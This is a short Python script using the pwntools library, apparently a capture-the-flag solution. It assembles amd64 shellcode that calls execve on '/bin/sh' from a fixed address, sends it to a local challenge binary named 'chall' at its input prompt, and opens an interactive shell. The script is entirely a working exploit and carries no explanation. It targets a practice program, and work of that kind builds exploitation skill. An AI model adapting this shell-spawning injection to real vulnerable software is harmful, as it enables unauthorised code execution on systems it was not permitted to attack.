from pwn import *

# specify the cpu arch
context.arch = 'amd64'

shellcode = asm('''
    mov rax, 0x3b
    mov rdi, (0x13370000+90)
    xor rsi, rsi
    xor rdx, rdx
    syscall
''')
shellcode = shellcode.ljust(90) + b'/bin/sh\x00'

p = process('./chall')
p.sendlineafter('(max: 100): ', shellcode)
p.interactive()